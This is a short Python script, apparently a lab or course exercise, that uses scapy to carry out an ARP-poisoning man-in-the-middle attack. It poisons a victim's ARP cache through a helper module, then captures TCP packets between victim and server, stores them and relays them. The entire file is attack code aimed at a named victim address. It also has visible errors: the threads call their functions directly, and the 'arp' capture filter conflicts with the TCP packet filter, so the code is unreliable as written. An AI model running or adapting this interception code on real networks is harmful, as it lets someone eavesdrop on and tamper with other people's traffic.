from scapy.all import *
from scapy.layers.inet import IP, TCP
import threading
from threading import Lock
import arpSpoof
import util

lock = Lock()
networkInterface = "enp0s3"
victimIP = "192.168.56.101"
#victimMAC = "08:00:27:b0:a1:ab"

spoofIP = "192.168.56.102"
#serverMAC = "08:00:27:c6:a4:61"


interceptedPkt = []

def arpSniffing(attackerMAC, victimIP, spoofIP, networkInterface):
    lock.acquire()
    victimMAC = util.getMAC(victimIP, networkInterface)
    serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]
    lock.release()

    def snifFilter(pkt):
        return (pkt.haslayer(TCP) and pkt[Ether].dst == attackerMAC and (
                pkt[IP].dst in spoofIP or pkt[IP].dst in victimIP))

    def intercept(pkt):
        interceptedPkt.append(pkt)
        lock.acquire()
        if pkt[IP].dst in  spoofIP:
            pkt[Ether].dst = serverMAC[spoofIP.index(pkt[IP].dst)]
        else:
            pkt[Ether].dst = victimMAC

        pkt[Ether].src = attackerMAC
        lock.release()
        sendp(pkt, iface=networkInterface)

    sniff(prn=intercept, iface=networkInterface, filter="arp", lfilter = snifFilter)

def arp(victimIP, spoofIP, networkInterface):
    poisonThread = threading.Thread(target=arpSpoof.arpPoisoning(victimIP, spoofIP, networkInterface))
    poisonThread.daemon = True
    poisonThread.start()

    sniffThread = threading.Thread(target = arpSniffing(get_if_hwaddr(networkInterface), victimIP, spoofIP, networkInterface))
    sniffThread.daemon = True
    sniffThread.start()

def main(victimIP, spoofIP, networkInterface):
    arp(victimIP, spoofIP, networkInterface)


main([victimIP],[spoofIP], networkInterface)